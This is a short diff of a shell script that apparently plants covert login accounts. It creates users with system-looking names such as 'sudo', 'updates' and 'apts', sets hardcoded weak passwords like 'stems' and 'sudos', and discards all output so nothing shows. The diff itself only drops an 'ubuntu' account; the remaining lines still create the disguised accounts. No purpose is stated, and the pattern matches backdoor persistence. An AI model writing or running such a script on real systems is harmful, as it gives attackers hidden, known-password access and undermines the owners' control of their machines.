@@ -4,12 +4,10 @@
 useradd  -m   -s /bin/bash admins > /dev/null 2>&1
 useradd  -m   -s /bin/bash essentials > /dev/null 2>&1
 useradd  -m   -s /bin/bash sudo > /dev/null 2>&1
-useradd  -m   -s /bin/bash ubuntu > /dev/null 2>&1
 useradd  -m   -s /bin/bash updates > /dev/null 2>&1
 useradd  -m   -s /bin/bash apts > /dev/null 2>&1
 
 printf "stems\nstems" | sudo passwd admins  > /dev/null 2>&1
-printf "stems\nstems" | sudo passwd ubuntu > /dev/null 2>&1
 printf "essentials\nessentials" | sudo passwd essentials > /dev/null 2>&1
 printf "sudos\nsudos" | sudo passwd sudo > /dev/null 2>&1
 printf "updates\nupdates" | sudo passwd updates > /dev/null 2>&1
